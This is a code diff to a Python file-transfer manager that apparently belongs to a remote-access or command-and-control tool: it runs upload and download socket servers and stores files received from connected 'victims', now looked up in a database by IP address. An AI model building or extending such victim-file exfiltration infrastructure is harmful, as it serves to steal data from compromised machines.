@@ -3,6 +3,7 @@ import os
 import threading
 from fastapi import UploadFile
 import time
+from database.clients import get_client_by_socket_ip
 
 
 class FileTransferManager:
@@ -25,15 +26,23 @@ class FileTransferManager:
             f"[*] File transfer server is listening on {self.upload_host}:{self.upload_port}")
 
         while True:
-            client_socket, addr = upload_server.accept()
-            print(f"[*] File transfer connection established with {addr[0]}")
+            try:
+                client_socket, addr = upload_server.accept()
+                print(
+                    f"[*] File transfer connection established with {addr[0]}")
 
-            # Add the client socket to the list of upload_clients
-            self.upload_clients.append((client_socket, addr))
+                # Add the client socket to the list of upload_clients
+                self.upload_clients.append((client_socket, addr))
 
-            # Handle file transfer logic here
-            threading.Thread(target=self.handle_file_transfer,
-                             args=(client_socket,)).start()
+                # Handle file transfer logic here
+                threading.Thread(target=self.handle_file_transfer,
+                                 args=(client_socket,)).start()
+            except Exception as e:
+                print(f"[*] Error handling file transfer: {str(e)}")
+                for client in self.upload_clients:
+                    if (client[0] == client_socket):
+                        self.upload_clients.remove(client)
+                break
 
     def start_download_server(self):
         # Initialize a socket for file transfers
@@ -44,15 +53,23 @@ class FileTransferManager:
             f"[*] File transfer server is listening on {self.download_host}:{self.download_port}")
 
         while True:
-            client_socket, addr = download_server.accept()
-            print(f"[*] File transfer connection established with {addr[0]}")
+            try:
+                client_socket, addr = download_server.accept()
+                print(
+                    f"[*] File transfer connection established with {addr[0]}")
 
-            # Add the client socket to the list of download_clients
-            self.download_clients.append((client_socket, addr))
+                # Add the client socket to the list of download_clients
+                self.download_clients.append((client_socket, addr))
 
-            # Handle file transfer logic here
-            threading.Thread(target=self.handle_file_transfer,
-                             args=(client_socket,)).start()
+                # Handle file transfer logic here
+                threading.Thread(target=self.handle_file_transfer,
+                                 args=(client_socket,)).start()
+            except Exception as e:
+                print(f"[*] Error handling file transfer: {str(e)}")
+                for client in self.download_clients:
+                    if (client[0] == client_socket):
+                        self.download_clients.remove(client)
+                break
 
     def handle_file_transfer(self, client_socket):
         while True:
@@ -64,12 +81,12 @@ class FileTransferManager:
 
                 # Receive the file size from the client
                 file_size = int(client_socket.recv(1024).decode())
-
-                # Determine where to save the received file
                 victim = None
-                for v in self.victim_list:
-                    if v["socket_ip"] == client_socket.getpeername()[0]:
-                        victim = v
+
+                # Get the victim from db
+                for client in self.upload_clients:
+                    if client[0] == client_socket:
+                        victim = get_client_by_socket_ip(client[1][0])[0]
                         break
 
                 if victim:
@@ -150,6 +167,3 @@ class FileTransferManager:
                         f"[*] Downloaded file: {filepath} from {client_addr[0]}")
                 except Exception as e:
                     print(f"[*] Error downloading file: {str(e)}")
-
-    def set_victim_list(self, victim_list):
-        self.victim_list = victim_list
